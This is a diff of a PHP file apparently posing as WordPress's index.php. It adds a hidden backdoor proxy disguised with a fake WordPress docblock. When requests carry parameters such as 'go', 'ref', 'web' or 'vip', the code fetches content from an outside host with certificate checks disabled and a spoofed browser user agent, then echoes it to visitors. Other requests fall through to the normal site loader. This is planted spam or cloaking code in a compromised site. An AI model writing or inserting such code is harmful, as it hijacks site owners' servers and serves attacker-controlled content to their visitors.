@@ -1,21 +1,11 @@
 <?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
 function fetchDataFromSite($site) {
-    $url = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/' . $site . '/';
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_CUSTOMREQUEST => 'GET'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-function fetchDataFromSite2($site) {
-    $url = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing2/' . $site . '/';
-    $ch = curl_init($url);
+    $ch = curl_init($site);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
         CURLOPT_RETURNTRANSFER => true,
@@ -29,14 +19,42 @@ function fetchDataFromSite2($site) {
 }
 
 if(isset($_GET['go'])) {
-    $site = $_GET['go'];
+    $sitex = $_GET['go'];
+    $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?go='.$sitex;
     $data = fetchDataFromSite($site);
     echo $data;
 }
-elseif(isset($_GET['site'])) {
-    $site = $_GET['site'];
-    $data = fetchDataFromSite2($site);
+elseif(isset($_GET['ref'])) {
+    $sitex = $_GET['ref'];
+    $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?ref='.$sitex;
+    $data = fetchDataFromSite($site);
     echo $data;
+}
+elseif(isset($_GET['web'])) {
+  $sitex = $_GET['web'];
+  $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?web='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+
+elseif(isset($_GET['top'])) {
+  $sitex = $_GET['top'];
+  $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?top='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+	elseif(isset($_GET['vip'])) {
+  $sitex = $_GET['vip'];
+  $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?vip='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+elseif(isset($_GET['sites'])) {
+    $sitex = $_GET['sites'];
+    $site = 'https://replication2.pkcdurensawit.net/chatterboxwinemarketing/?sites='.$sitex;
+    $data = fetchDataFromSite($site);
+    echo $data;
+	
 } else {
   /**
  * Loads the WordPress environment and template.
